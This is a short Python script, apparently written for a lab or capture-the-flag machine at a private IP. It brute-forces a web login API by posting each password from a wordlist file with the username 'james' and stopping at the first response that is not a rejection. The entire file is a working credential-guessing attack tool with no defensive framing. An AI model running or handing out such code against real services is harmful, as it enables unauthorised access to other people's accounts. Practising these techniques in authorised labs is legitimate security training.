#!/usr/bin/env python3

import requests as r 
import json

########################################
# HEADER
URL = "http://10.10.155.18/api/user/login"

password = []
good_password = ""
########################################

########################################
# READING PASSWORD_FILE AND CLOSE IT
with open("colors_numbers.txt", "r") as PASSWORD_FILE:
  for line in PASSWORD_FILE:
    password.append(line.replace("\n", ""))

########################################

########################################
# MAKE REQUESTS AND CHECK IF FAILS
def doLogin(password):
  creds = {"username": "james", "password": password}
  response = r.post(URL, json=creds)
  if response.status_code != 200:
    print("Error:", response.status_code)
  else:
    good_response = json.loads(response.text)
    return good_response
########################################

########################################
# BRUTE FORCE MADAFAKA
for passwd in password:
  response = doLogin(passwd)

  if response["status"] != "Invalid Username Or Password":

    print(passwd, ": Success")
    break

  else:
    print(passwd, ": Failed")
########################################
